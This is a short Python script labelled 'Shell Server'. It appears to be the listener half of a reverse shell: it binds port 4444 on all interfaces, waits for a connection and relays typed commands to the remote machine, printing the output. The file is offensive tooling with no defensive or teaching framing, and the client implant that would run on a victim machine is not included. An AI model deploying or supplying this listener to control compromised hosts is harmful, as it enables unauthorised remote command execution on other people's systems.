import socket
import sys
import argparse

parser = argparse.ArgumentParser(description='Shell Server')

parser.add_argument('-p', '--port', default=4444, help='Listen Port Number')

args = parser.parse_args()

def server(port):
    # create tcp socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',port))
    
    try:
        s.listen(9)
        
        myHost = socket.gethostbyname(socket.gethostname())
        print(f'[+] server is listen on port {myHost}:{port}')

        conn, addr = s.accept()
        print(f'[+] Connection from {addr[0]}:{addr[1]}')
        
        # send shell prompt
        conn.send('Enter Command '.encode())

        while True:
            try:
                conn.send(str(input('SHELL-> ')).encode())

                result = conn.recv(2048).decode()
                # exit conditions
                if result.lower() == 'exit' or result == '':
                    s.close()
                    print(f'[-] Exiting...')
                    sys.exit(-1)
                print(result)
        
            except KeyboardInterrupt:
                s.close()
                print(f'[-] Exit...')
                sys.exit(-1)
    except KeyboardInterrupt:
        sys.exit(-1)
        conn.close()

if __name__ == '__main__':
    server(args.port)